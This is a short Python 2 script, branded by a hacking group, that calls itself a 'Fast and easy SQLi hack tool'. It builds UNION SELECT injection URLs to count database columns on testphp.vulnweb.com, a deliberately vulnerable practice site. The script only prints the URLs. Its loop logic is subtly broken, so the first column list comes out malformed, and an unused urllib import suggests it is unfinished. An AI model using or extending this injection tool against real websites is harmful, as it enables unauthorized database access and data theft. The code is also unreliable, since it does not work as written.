import subprocess as sp
import urllib
sp.call('cls',shell=True)
header="""
____ _              ___      _                     _____                      
/__   \ |__   ___    / __\   _| |__   ___ _ __ ___  /__   \___  __ _ _ __ ___  
  / /\/ '_ \ / _ \  / / | | | | '_ \ / _ \ '__/ __|   / /\/ _ \/ _` | '_ ` _ \ 
 / /  | | | |  __/ / /__| |_| | |_) |  __/ |  \__ \  / / |  __/ (_| | | | | | |
 \/   |_| |_|\___| \____/\__, |_.__/ \___|_|  |___/  \/   \___|\__,_|_| |_| |_|
                         |___/                                                 

More: https://www.facebook.com/TheCybersTeam
Fast and easy SQLi hack tool Beta 0.1
"""
print header

url = "http://testphp.vulnweb.com/listproducts.php?cat="

def countColumns(url):
    print "Start Count Columns..."
    url = url + "-1 union select "
    start = 1
    finish = 11
    for i in range(start,finish):
        if i != start and i != finish:
            url = url + ", "
        url = url + str(i)
        print url

countColumns(url)



